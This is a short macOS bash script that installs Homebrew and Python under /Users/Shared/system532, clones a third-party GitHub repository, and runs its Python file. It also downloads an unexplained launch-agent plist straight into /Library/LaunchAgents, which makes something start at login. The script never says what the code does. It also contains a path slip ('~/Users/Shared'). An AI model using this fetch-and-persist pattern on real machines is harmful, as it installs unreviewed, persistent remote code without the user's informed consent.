#!/bin/bash
cd /Users/Shared/system532
if [ ! -d "/Users/Shared/system532/homebrew" ]; then
  echo "Installing Homebrew..."
  mkdir homebrew
  curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
else
  echo "Homebrew already installed."
fi
export PATH="/Users/Shared/system532/homebrew/bin:$PATH"
brew --version
brew install python
python3 --version
pip3 --version
git clone https://github.com/BigJ1m/stringCup.git
cd
cd /Library/LaunchAgents/
curl -O https://raw.githubusercontent.com/BigJ1m/532Agent/refs/heads/main/com.example.system532.plist
cd
cd ~/Users/Shared/system532
python3 stringCup/cup.py
